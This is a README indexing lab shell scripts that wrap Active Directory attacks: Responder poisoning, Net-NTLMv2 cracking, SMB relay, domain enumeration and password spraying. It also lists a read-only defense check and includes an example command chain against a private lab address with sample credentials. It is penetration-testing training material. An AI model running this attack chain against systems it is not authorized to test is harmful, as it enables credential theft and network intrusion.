# Lab scripts

Executable helpers that reproduce the workflows in the notes against a lab you
own. They are **thin wrappers** — every command a script runs is printed before
it runs and is spelled out in the matching Markdown page. They add nothing the
notes don't already document; they just make a run repeatable.

> Only run the offensive scripts against systems you own or are explicitly
> authorized to test. Each one prompts for confirmation before acting; set
> `LAB_AUTHORIZED=1` in the environment to skip the prompt inside a trusted lab.

| Script | Technique | Notes page |
|--------|-----------|------------|
| `01-responder-poison.sh` | LLMNR/NBT-NS poisoning (`-A` = passive) | [LLMNR-NBT-NS-Poisoning.md](../LLMNR-NBT-NS-Poisoning.md), [lab-walkthrough.md](../lab-walkthrough.md) |
| `02-crack-ntlmv2.sh` | Crack captured Net-NTLMv2 (hashcat `-m 5600`) | [lab-walkthrough.md](../lab-walkthrough.md) |
| `03-smb-relay.sh` | Find signing-less hosts + `ntlmrelayx` | [smb-relay-attack.md](../smb-relay-attack.md) |
| `04-ad-enum.sh` | Enumerate/dump a domain with `nxc` | [ad-enumeration.md](../ad-enumeration.md) |
| `05-password-spray.sh` | Kerberos user-enum + lockout-aware spray | [password-spraying.md](../password-spraying.md) |
| `06-defense-check.sh` | Read-only: verify the mitigations hold | README "Defending against this" |

`lib.sh` holds shared helpers (output, tool checks, the authorization gate) and
is sourced by the others — don't run it directly.

## Tools expected on PATH

`responder`, `hashcat`, `nmap`, `ntlmrelayx.py` (Impacket), `nxc` (NetExec),
`kerbrute`. Each script checks for the one it needs and tells you if it's
missing. All are preinstalled on Kali; otherwise install from each project's
repo.

## Example run (the chain, end to end)

```bash
# 1. capture on your lab interface
./01-responder-poison.sh -i eth0
# 2. crack what landed in Responder's logs
./02-crack-ntlmv2.sh captured-ntlmv2.txt
# 3. with a valid credential, enumerate the DC
./04-ad-enum.sh -H 192.168.0.129 -u jsmith -p 'Sy3d@001' users
# 4. spray a reused password (check lockout first)
./05-password-spray.sh spray -d lab.local --dc 192.168.0.129 -U users.txt -p 'Sy3d@001'
# ...or confirm a hardened host resists all of it
./06-defense-check.sh -H 192.168.0.129 -u jsmith -p 'Sy3d@001'
```
